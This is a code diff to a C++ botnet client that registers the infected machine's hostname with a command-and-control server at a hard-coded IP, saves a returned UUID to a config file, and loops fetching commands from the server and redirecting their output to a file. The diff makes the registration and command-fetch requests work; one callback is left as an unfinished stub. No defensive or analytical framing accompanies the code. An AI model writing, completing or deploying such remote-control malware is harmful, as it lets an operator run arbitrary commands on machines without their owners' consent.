@@ -23,7 +23,7 @@
 #include <windows.h>
 #endif
 
-std::string c2_url = "https://10.13.160.97:5000";
+std::string c2_url = "http://10.13.160.97:5000/bot/register/";
 
 std::string process_name;
 
@@ -34,19 +34,14 @@ std::string get_host_name() {
     return std::string{buffer};
 }
 
-/*
-std::string data;
-
-size_t read_data(char *buffer, size_t size, size_t nitems) {
-	strncpy(buffer, data.data(), size * nitems);
-	return size * nitems;
-}
-*/
-
 size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
     auto& str = *reinterpret_cast<std::string*>(userp);
     str.append((char*)contents, size* nmemb);
     return size * nmemb;
+}
+
+size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp) {
+    //TODO: Complete
 }
 
 [[noreturn]]
@@ -58,18 +53,26 @@ void client_work() {
         std::cerr << "curl_easy_init failed" << std::endl;
     }
 
+    c2_url += hostname;
+
+    std::string raw_json;
+
     curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, hostname.data());
-    //curl_easy_setopt(curl, CURLOPT_)
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
+    curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     auto result = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
 
+    //std::cout << "Data:" << read_data << std::endl;
+
     if (result != CURLE_OK) {
         std::cerr << "POST request failed" << std::endl;
+        std::cerr << curl_easy_strerror(result);
         exit(EXIT_FAILURE);
     }
-
-    std::string raw_json;
 
     curl_easy_reset(curl);
 
@@ -83,10 +86,18 @@ void client_work() {
     document.Parse(raw_json.c_str());
     std::string uuid = document["uuid"].GetString();
 
+    std::cout << "UUID: " << uuid << std::endl;
+
     //Write UUID to config file
-    std::fstream fout{"~/.config/c3.txt"};
-    fout << uuid;
-    fout.close();
+    FILE* fout = fopen("~/.config/c3.txt", "w+");
+    if (!fout) {
+        std::cerr << "Failed to open ~/.config/c3.txt" << std::endl;
+        std::cerr << strerror(errno) << std::endl;
+        errno = 0;
+        exit(EXIT_FAILURE);
+    }
+    fwrite(uuid.c_str(), sizeof(char), uuid.size(), fout);
+    fflush(fout);
 
     while (true) {
         //Issue get request for work
@@ -98,6 +109,7 @@ void client_work() {
         curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command);
+        curl_easy_perform(curl);
 
         //Pipe output of command to file
         command += " > ./output.txt";
